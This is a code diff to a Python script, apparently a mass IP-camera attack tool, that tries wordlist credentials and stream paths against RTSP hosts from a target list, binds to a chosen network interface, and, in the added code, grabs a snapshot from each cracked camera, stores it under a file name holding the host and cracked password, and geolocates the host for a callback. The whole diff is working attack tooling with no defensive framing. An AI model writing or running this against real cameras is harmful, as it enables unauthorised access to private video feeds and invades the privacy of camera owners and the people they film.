@@ -1,12 +1,14 @@
 #!/usr/bin/env python
+from concurrent.futures import ThreadPoolExecutor
 from functools import partial
+from lib.rtsp import capture_image
+from lib.utils import geoip_str_online, str_to_filename
 import os
 import re
-from socket import socket, timeout
+from socket import SOL_SOCKET, SO_BINDTODEVICE, socket, timeout
 
 from fire import Fire
 from tqdm import tqdm
-from concurrent.futures import ThreadPoolExecutor
 
 # directories to work with
 DIR = os.path.dirname(os.path.abspath(__file__))
@@ -19,19 +21,24 @@ class Target:
     protocol: str = 'rtsp'
     host: str
     port: str = '554'
+    iface = None
     _status_re = re.compile(r'RTSP/\d\.\d (\d\d\d)')
 
-    def __init__(self, host):
+    def __init__(self, host, iface=None):
         port = self.port
 
         if ':' in host:
             host, port = host.split(':')
 
         self.host, self.port = host, port
+        self._iface = iface
 
     def __enter__(self):
         self._socket = socket()
-        self._socket.settimeout(3)
+        self._socket.settimeout(10)
+        if self._iface:
+            self._socket.setsockopt(
+                SOL_SOCKET, SO_BINDTODEVICE, self._iface.encode())
         return self
 
     def __exit__(self, *_):
@@ -105,19 +112,15 @@ class Attack():
         for path in self._paths:
             url, ok, c, t = target.has_path(path)
             if c >= 500:
-                # print(f'[{c}] {url}')
                 return
 
             if not ok:
                 continue
 
-            # print('•', url)
-
             if last_cred:
                 url, ok, c, t = target.has_access(path, last_cred)
 
                 if c >= 500:
-                    # print(f'[{c}] {url}')
                     return
 
                 if ok:
@@ -130,56 +133,78 @@ class Attack():
 
                 url, ok, c, t = target.has_access(path, cred)
 
-                # print(f'» [{c}] {cred}')
-
                 if c >= 500:
-                    # print(f'[{c}] {url}')
                     return
+
                 if ok:
-                    # print('Weeeeeee! =>', url)
-                    yield url, t
                     last_cred = cred
+                    yield url, t
                     break
+
             if not last_cred:
                 return  # have no valid creds, giving up 4 now
 
 
-def register(url):
-    print(url)
-
-
-def capture(url):
+def capture(prefer_ffmpeg, capture_callback, stream_url):
+    from urllib.parse import urlparse
     if not os.path.exists(CAPTURES_DIR):
         os.mkdir(CAPTURES_DIR)
-    pass
+
+    up = urlparse(stream_url)
+    p = str_to_filename(f'{up.path}{up.params}')
+
+    img_name = f'{up.hostname}_{up.port}_{up.username}_{up.password}_{p}'
+    img_path = os.path.join(CAPTURES_DIR, f'{img_name}.jpg')
+
+    captured = capture_image(stream_url, img_path, prefer_ffmpeg)
+
+    if captured and capture_callback:
+        import subprocess
+        subprocess.Popen([capture_callback, stream_url,
+                          img_path, geoip_str_online(up.hostname)])
 
 
-def process_host(paths, creds, host):
+def process_host(paths, creds, iface, host):
     results = []
-    with Target(host) as target:
+    with Target(host, iface) as target:
         for url, t in Attack(target, paths, creds):
             results.append((url, t))
     return results
 
 
-def main(H=None, P=None, C=None):
+def main(H=None, P=None, C=None, ff=False, cc='', ht=None, i=None):
     with open(P or os.path.join(DATA_DIR, 'rtsp_paths_my.txt')) as f:
         paths = [ln.rstrip() for ln in f]
 
     with open(C or os.path.join(DATA_DIR, 'rtsp_creds.txt')) as f:
         creds = [ln.rstrip() for ln in f]
 
-    ph = partial(process_host, paths, creds)
+    ph = partial(process_host, paths, creds, i)
+    capture_cam = partial(capture, ff, cc)
 
     with open(H or os.path.join(LOCAL_DIR, 'hosts_554.txt')) as f:
         total = sum(1 for _ in f)
         f.seek(0)
-        with ThreadPoolExecutor(256) as ex:
+
+        cams = []
+
+        print('[*] Check targets')
+
+        with ThreadPoolExecutor(ht) as ex:
             hosts = (ln.rstrip() for ln in f)
             results = tqdm(ex.map(ph, hosts), total=total)
             for host_results in list(results):
                 for url, t in host_results:
+                    cams.append(url)
                     print(f'[C] {t:>4} ms {url}')
+
+        print('[*] Capture')
+
+        with ThreadPoolExecutor() as ex:
+            results = tqdm(ex.map(capture_cam, cams), total=len(cams))
+            captured_count = sum(1 for res in results if res)
+
+        print(f'[+] Captured {captured_count} cams')
 
 
 if __name__ == "__main__":
